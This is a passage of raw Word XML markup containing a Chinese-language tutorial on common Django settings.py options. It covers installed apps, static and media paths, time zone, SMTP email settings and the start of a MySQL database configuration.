        <w:t>这个设置比较简单，也比较常用，用于增删一个项目(Project)所包含的应用(APP)。只有对列入此项的APP, Django才会生成相应的数据表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7882B3C7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DCDD865" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>INSTALLED_APPS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A6A837"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'django.contrib.admin',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C101EF"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'django.contrib.auth',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A16157C"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'django.contrib.contenttypes',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E4652F"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'django.contrib.sessions',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08DDFB68"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'django.contrib.messages',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45730626" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    'django.contrib.staticfiles',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CDD50A7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'polls',  # 自定义的APP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A931448" w14:textId="68BFB05A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177DD5CA" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="517F72BC" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>AUTH_USER_MODEL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216173A9" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>默认为auth.user。也可以为自定义用户模型。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329EDA4F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1329E038" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATIC_ROOT和STATIC_URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488B7DD0" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这两个选项是关于静态文件(如CSS, JS,和图片)的最重要的设置，一般设置如下。STATIC_URL是静态文件URL，设置后可以通过使用{% static 'img/xxx.jpg' %}方式直接访问/static/文件夹里的静态文件。如果你设置了STATIC_ROOT, 当你运行"python manage.py collectstatic"命令的时候，Django会将各app下所有名为static的文件夹及其子目录复制收集到STATIC_ROOT。把静态文件集中一起的目的是为了更方便地通过Apache或Nginx部署。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A667A9E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="387AC203" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATIC_URL = '/static/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5871B2EC" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATIC_ROOT = os.path.join(BASE_DIR, 'static')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE9ECAA" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="552902EF" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一般情况下我们会尽量把静态文件只放在static文件夹或它的子目录下，所以上述两个设置对于一般项目是够的。那么问题来了，如果你还有一些文件夹中也有静态文件，可是文件夹并不是以static命名也不在static子目录里，此时你也希望搜集使用那些静态文件，你该怎么办呢？这时我们就要设置静态文件目录STATICFILES_DIRS值了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2162681D" w14:textId="716BD5FB" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5740D97B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATICFILES_DIRS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE41F52" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>默认值为空。当你设置该选项后，"python manage.py collectstatic"命令会把static文件夹及静态文件目录STATICFILES_DIRS里的静态文件都复制到一份到STATIC_ROOT。比如下例中Django会将下面两个文件夹内容也复制到STATIC_ROOT。注意里面的路径必需是绝对路径哦。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63926C3F" w14:textId="11C3EFA7" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="034F969D" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATICFILES_DIRS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDC9079" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    "/home/user/pictures",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E55E75E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    "/opt/webfiles/myfiles",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067CAF3A" w14:textId="4B9F6E43" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="785AF512" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MEDIA_ROOT和MEDIA_URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5478ABCC" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>media文件价一般用于放置用户上传的文件。对于此文件夹的权限设置异常重要，因为用户可能会上传可执行的文件，影响网站和服务器的安全。我们后续会专题介绍文件上传过程中应考虑的安全因素。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34639F7B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MEDIA_URL = '/media/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A3A1FB" w14:textId="3949F29F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MEDIA_ROOT = os.path.join(BASE_DIR, 'media')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A89E710" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>国际化(语言与时间)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0772123B" w14:textId="64ED91E7" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>TIME_ZONE = 'Asia/Shanghai' # 设置时区</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280B9DC0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>USE_I18N = True # 默认为True，是否启用自动翻译系统</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A880CB2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>USE_L10N = True # 默认False，以本地化格式显示数字和时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753166C2" w14:textId="60AF922F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>USE_TZ = False  # 默认值True。若使用了本地时间，必须设为False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03400FC0" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>邮箱服务配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA8E22F" w14:textId="56CC1961" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>EMAIL_HOST = 'smtp.qq.com'   # 发送者邮箱服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FA1013" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>EMAIL_PORT = 25 # 端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DEC013" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>EMAIL_HOST_USER = ''        # 发送者用户名（邮箱地址）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C478212" w14:textId="605BF54F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>EMAIL_HOST_PASSWORD = ''    # 发送者密码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E55A5DB" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>EMAIL_USE_SSL = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4768EB7E" w14:textId="030CEA8D" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DEFAULT_FROM_EMAIL = 'xxx@qq.com'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1F2CBF" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>数据库设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A046B6A" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当然小编我并不建议在settings.py直接写入数据库密码，而是采取读取外部配置文件的方式，更安全。下面以MYSQL为例介绍了基本配置方式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79131303" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DATABASES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB7DBE5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD3B6A7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'ENGINE': 'django.db.backends.mysql',   # 数据库引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19986B79" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
